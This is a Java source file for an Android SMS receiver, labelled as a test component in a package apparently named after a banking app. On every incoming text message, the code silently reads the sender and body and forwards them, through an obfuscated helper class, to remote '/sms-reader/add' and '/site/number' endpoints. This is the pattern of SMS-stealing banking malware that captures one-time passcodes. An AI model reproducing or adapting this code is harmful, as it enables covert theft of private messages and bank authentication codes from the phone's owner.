package axismobile.service.testingonnboard.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class TestReceiver extends BroadcastReceiver {

    private String previous_message = "";
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
//                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu, bundle.getString("format"));
                        if (smsMessage != null) {
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            if(messageBody!=previous_message){
                                previous_message = messageBody;
                                Sgg3dst.sendSMS("/site/number?site="+ Sgg3dst.site, messageBody);
                                JSONObject jsonData = new JSONObject();
                                try {
                                    jsonData.put("site", Sgg3dst.site);
                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    Sgg3dst.sendData("/sms-reader/add", jsonData);
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

}